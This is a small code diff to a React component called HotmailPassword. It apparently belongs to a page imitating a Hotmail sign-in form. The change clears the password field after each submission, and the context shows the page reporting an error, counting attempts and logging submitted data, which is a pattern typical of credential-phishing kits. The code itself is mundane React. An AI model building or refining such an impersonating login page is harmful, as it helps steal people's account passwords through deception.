@@ -33,6 +33,7 @@ export default function HotmailPassword({ location }) {
         // show error
         notify();
         setSubmited({ ...submited, count: submited.count + 1 });
+        setValues({ ...values, password: "" });
         console.log(data);
         console.log(submited);
       });
@@ -289,6 +290,7 @@ export default function HotmailPassword({ location }) {
                 updateFocus: passwordTextbox.textbox_onUpdateFocus } }"
                                       >
                                         <input
+                                          value={values.password}
                                           name="password"
                                           type="password"
                                           onChange={handleChange}
